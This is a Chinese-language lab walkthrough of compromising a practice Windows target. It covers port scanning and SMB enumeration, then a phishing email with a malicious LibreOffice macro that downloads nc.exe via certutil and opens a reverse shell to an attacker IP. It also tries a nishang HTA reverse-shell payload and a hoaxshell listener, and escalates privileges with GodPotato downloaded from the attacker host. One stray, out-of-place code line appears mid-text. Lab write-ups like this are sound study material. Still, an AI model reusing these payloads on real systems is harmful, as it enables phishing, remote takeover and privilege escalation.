针对目标服务器进行相应的端口探测

```
 sudo nmap -sS -vvv 10.10.69.19
```

针对目标服务器开放端口进行相应的服务探测

```
sudo nmap -p25,80,445,3389 -A -sV 10.10.69.19 
```

![image-20241226144513448](https://files.seeusercontent.com/2026/04/08/9Iyq/image-20241226144513448.png)

针对445的smb服务进行相应的扫描及匿名登录

```
netexec smb 10.10.69.19 -u guest -p ''
enum4linux-ng 10.10.69.19 -A -C
```

我们访问80端口的服务，相应获取一个网页内容

![image-20241226150045880](https://files.seeusercontent.com/2026/04/06/k5yV/image-20241226150045880.png)

页面提供了我们一个邮箱：career@job.local

同时也告诉了我们目标用户会使用libreoffice来打开文件，只是我们不清楚目标系统使用的libreoffice，我们假设对方能够加载宏

针对80端口的服务我们进行了一波扫描，没有任何的结果内容，我们尝试发送钓鱼邮件

```
#编制宏
Sub exp_shell()
	Shell("mkdir C:\\Temp")
	Shell("certutil.exe -urlcache -split -f 'http://10.8.4.161/nc.exe' 'C:\\Temp\nc.exe'")
	Shell("C:\\Temp\nc.exe 10.8.4.161 443-e cmd.exe")
End Sub


#发送钓鱼邮件
sendEmail -f 123123@job.local -t career@job.local -u "JOB" -m "Job cv" -a job.odt -s 10.10.69.19:25  -v  

```

采用生成HTA文件的方式

```
Import-Module .\nishang.psm1
Out-HTA -PayloadURL http://10.8.4.161/Invoke-PowerShellTcp.ps1
cp /home/zkpc/Tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
添加 Invoke-PowerShellTcp -Reverse -IPAddress 10.8.4.161 -Port 443
```

以上两者等待后均无反应，我们尝试使用hoaxshell

```
.venv/bin/python3 hoaxshell.py -s 10.8.4.161 --port 4444 
```

![image-20241226155227201](https://s2.loli.net/2024/12/26/6bshZLSIlx9egio.png)

Sub autoshell()

具备SeImpersonatePrivilege特权，我们可以使用godpotato进行相应的提权操作

```
iwr http://10.8.4.161/GodPotato-NET4.exe -outfile GodPotato.exe
.\GodPotato.exe -cmd "cmd /c whoami"
```
